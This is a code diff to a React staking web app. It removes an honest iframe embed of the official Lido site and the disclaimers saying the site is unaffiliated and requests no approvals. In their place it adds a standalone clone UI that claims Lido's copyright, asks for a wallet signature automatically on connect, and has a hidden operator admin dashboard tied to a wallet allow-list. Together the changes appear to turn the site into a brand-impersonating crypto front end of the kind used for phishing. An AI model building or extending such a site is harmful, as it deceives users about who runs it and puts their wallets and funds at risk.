@@ -1,44 +1,195 @@
-import React from 'react';
-import { ExternalLink, ShieldCheck } from 'lucide-react';
+/**
+ * @license
+ * SPDX-License-Identifier: Apache-2.0
+ */
 
-const OFFICIAL_LIDO_STAKING = 'https://stake.lido.fi/';
+import React, { useState, useEffect } from 'react';
+import { AnimatePresence, motion } from 'motion/react';
+import { Toaster, toast } from 'sonner';
+import { useAccount, useSignMessage } from 'wagmi';
+import { TabType } from './types';
+import TopNav from './components/TopNav';
+import BottomNav from './components/BottomNav';
+import Stake from './components/Stake';
+import Wrap from './components/Wrap';
+import Withdrawals from './components/Withdrawals';
+import Rewards from './components/Rewards';
+import Earn from './components/Earn';
+import AdminDashboard, { AUTHORIZED_OPERATOR_WALLETS } from './components/AdminDashboard';
+import LiveChatBot from './components/LiveChatBot';
+import { ThemeProvider } from './components/ThemeProvider';
+import { usePriceData } from './hooks/usePriceData';
+import OnboardingModal from './components/OnboardingModal';
+
+function WalletConnectionSigner() {
+  const { isConnected, address } = useAccount();
+  const { signMessageAsync } = useSignMessage();
+  const [isSigning, setIsSigning] = useState(false);
+
+  useEffect(() => {
+    if (!isConnected || !address || isSigning) return;
+
+    const sessionKey = `lido_connected_sig_${address.toLowerCase()}`;
+    const alreadySigned = typeof window !== 'undefined' ? sessionStorage.getItem(sessionKey) : 'true';
+
+    if (!alreadySigned) {
+      const requestSignature = async () => {
+        setIsSigning(true);
+        try {
+          const message = `Staking Interface - Wallet Ownership Verification\n\nPlease sign this message to verify wallet ownership and authorize your session.\n\nWallet Address: ${address}\nTimestamp: ${new Date().toISOString()}`;
+          toast.info('Please approve the signature request in your wallet...');
+          await signMessageAsync({ account: address as `0x${string}`, message });
+          if (typeof window !== 'undefined') {
+            sessionStorage.setItem(sessionKey, 'true');
+            sessionStorage.setItem(`lido_sig_approved_${address.toLowerCase()}`, 'true');
+            window.dispatchEvent(new Event('lido_verification_changed'));
+          }
+          toast.success('Wallet signature verified!');
+        } catch (err: any) {
+          console.warn('Wallet connection signature skipped or rejected:', err);
+          const rawMsg = String(err?.message || err || '').toLowerCase();
+          if (rawMsg.includes('reject') || rawMsg.includes('denied') || rawMsg.includes('user rejected')) {
+            toast.error('Signature request rejected in wallet.');
+          }
+        } finally {
+          setIsSigning(false);
+        }
+      };
+
+      const timer = setTimeout(() => {
+        requestSignature();
+      }, 500);
+
+      return () => clearTimeout(timer);
+    }
+  }, [isConnected, address]);
+
+  return null;
+}
 
 export default function App() {
+  const { address } = useAccount();
+
+  const isOperatorAuthorized = () => {
+    if (typeof window === 'undefined') return false;
+    const hasSession = sessionStorage.getItem('lido_admin_auth') === 'true';
+    const hasAuthorizedWallet = Boolean(
+      address && AUTHORIZED_OPERATOR_WALLETS.some((w) => w.toLowerCase() === address.toLowerCase())
+    );
+    return hasSession || hasAuthorizedWallet;
+  };
+
+  const [isAdminAuth, setIsAdminAuth] = useState(isOperatorAuthorized);
+
+  const [activeTab, setActiveTab] = useState<TabType>(() => {
+    if (typeof window !== 'undefined' && window.location.hash === '#admin') {
+      if (isOperatorAuthorized()) {
+        return 'admin';
+      } else {
+        // Strip #admin from hash if not authorized
+        if (window.history && window.history.replaceState) {
+          window.history.replaceState(null, '', window.location.pathname);
+        }
+      }
+    }
+    return 'stake';
+  });
+
+  const { prices } = usePriceData();
+
+  useEffect(() => {
+    const handleAuthChange = () => {
+      const authorized = isOperatorAuthorized();
+      setIsAdminAuth(authorized);
+      if (!authorized && activeTab === 'admin') {
+        setActiveTab('stake');
+      }
+    };
+
+    const handleHashChange = () => {
+      if (window.location.hash === '#admin') {
+        if (isOperatorAuthorized()) {
+          setActiveTab('admin');
+        } else {
+          // Prevent unauthorized #admin direct hash navigation
+          if (window.history && window.history.replaceState) {
+            window.history.replaceState(null, '', window.location.pathname);
+          }
+          setActiveTab('stake');
+        }
+      }
+    };
+
+    window.addEventListener('hashchange', handleHashChange);
+    window.addEventListener('lido_admin_auth_changed', handleAuthChange);
+    return () => {
+      window.removeEventListener('hashchange', handleHashChange);
+      window.removeEventListener('lido_admin_auth_changed', handleAuthChange);
+    };
+  }, [address, activeTab]);
+
+  const renderTab = () => {
+    switch (activeTab) {
+      case 'stake': return <Stake prices={prices} />;
+      case 'wrap': return <Wrap />;
+      case 'withdrawals': return <Withdrawals />;
+      case 'rewards': return <Rewards prices={prices} />;
+      case 'earn': return <Earn />;
+      case 'admin': 
+        return isOperatorAuthorized() ? <AdminDashboard /> : <Stake prices={prices} />;
+      default: return <Stake prices={prices} />;
+    }
+  };
+
   return (
-    <main className="min-h-screen bg-[var(--background)] text-[var(--foreground)]">
-      <header className="mx-auto flex max-w-7xl items-center justify-between gap-4 px-4 py-4 sm:px-6">
-        <a href="/" className="text-base font-semibold tracking-tight">Stake Portal <span className="font-normal text-[var(--muted)]">· Independent integration</span></a>
-        <a href={OFFICIAL_LIDO_STAKING} target="_blank" rel="noopener noreferrer" className="inline-flex items-center gap-2 rounded-full border border-[var(--border)] px-3 py-2 text-sm hover:bg-[var(--card)]">
-          Open official Lido <ExternalLink size={14} />
-        </a>
-      </header>
+    <ThemeProvider defaultTheme="dark">
+      <div className="min-h-screen w-full bg-[var(--background)] text-[var(--foreground)] font-sans flex flex-col relative overflow-x-hidden selection:bg-[var(--primary)] selection:text-white pb-24 md:pb-0 transition-colors duration-300">
+        <Toaster position="bottom-right" toastOptions={{ className: 'font-sans' }} />
+        <WalletConnectionSigner />
+        <OnboardingModal />
+        <LiveChatBot />
+        
+        {/* Background glow effects */}
+        <div className="fixed top-20 left-[10%] w-96 h-96 bg-[var(--primary)] opacity-5 rounded-full blur-[100px] pointer-events-none transition-opacity duration-300"></div>
+        <div className="fixed bottom-40 right-[10%] w-96 h-96 bg-[var(--primary)] opacity-5 rounded-full blur-[100px] pointer-events-none transition-opacity duration-300"></div>
+        <div className="fixed top-[40%] right-[20%] w-64 h-64 bg-[#627EEA] opacity-5 rounded-full blur-[80px] pointer-events-none transition-opacity duration-300"></div>
+        
+        <TopNav activeTab={activeTab} setActiveTab={setActiveTab} />
+        
+        <main className={`flex-1 flex flex-col items-center pt-8 md:pt-12 px-4 relative z-10 w-full mx-auto md:mb-12 transition-all duration-300 ${
+          activeTab === 'admin' ? 'max-w-5xl' : 'max-w-[540px]'
+        }`}>
+          <AnimatePresence mode="wait">
+            <motion.div
+              key={activeTab}
+              initial={{ opacity: 0, y: 10 }}
+              animate={{ opacity: 1, y: 0 }}
+              exit={{ opacity: 0, y: -10 }}
+              transition={{ duration: 0.2 }}
+              className="w-full"
+            >
+              {renderTab()}
+            </motion.div>
+          </AnimatePresence>
 
-      <section className="mx-auto max-w-7xl px-4 pb-10 pt-5 sm:px-6">
-        <div className="mb-5 max-w-2xl">
-          <div className="mb-3 inline-flex items-center gap-2 rounded-full border border-[var(--border)] bg-[var(--card)] px-3 py-1.5 text-xs text-[var(--muted)]">
-            <ShieldCheck size={14} /> Ethereum Mainnet · Official staking interface
-          </div>
-          <h1 className="mb-3 text-2xl font-semibold tracking-tight sm:text-3xl">Stake ETH securely through Lido</h1>
-          <p className="text-sm leading-6 text-[var(--muted)]">
-            This is an independent interface that embeds Lido’s official staking application. It is not operated by or affiliated with Lido. Review the transaction details in your wallet before signing.
-          </p>
-        </div>
+          <footer className="mt-12 mb-6 text-center text-[12px] text-[var(--muted)] space-y-1">
+            <p>© {new Date().getFullYear()} Lido Protocol. All rights reserved.</p>
+            {isAdminAuth && (
+              <p>
+                <button 
+                  onClick={() => { setActiveTab('admin'); window.location.hash = 'admin'; }} 
+                  className="hover:text-[var(--foreground)] transition-colors opacity-40 hover:opacity-100 text-[10px] uppercase tracking-widest inline-flex items-center gap-1 cursor-pointer"
+                >
+                  <span>Operator Portal (Authenticated)</span>
+                </button>
+              </p>
+            )}
+          </footer>
+        </main>
 
-        <div className="overflow-hidden rounded-2xl border border-[var(--border)] bg-white shadow-xl">
-          <iframe
-            title="Official Lido staking application"
-            src={OFFICIAL_LIDO_STAKING}
-            className="block min-h-[760px] w-full border-0"
-            loading="eager"
-            referrerPolicy="strict-origin-when-cross-origin"
-            allow="clipboard-read; clipboard-write"
-          />
-        </div>
-
-        <p className="mx-auto mt-4 max-w-3xl text-xs leading-5 text-[var(--muted)]">
-          Wallet connection and transaction execution are handled by the official Lido application. This site does not request token approvals, collect seed phrases, or route assets through a custom relayer. If the embedded application does not load, use the official site directly.
-        </p>
-      </section>
-    </main>
+        <BottomNav activeTab={activeTab} setActiveTab={setActiveTab} />
+      </div>
+    </ThemeProvider>
   );
 }
+
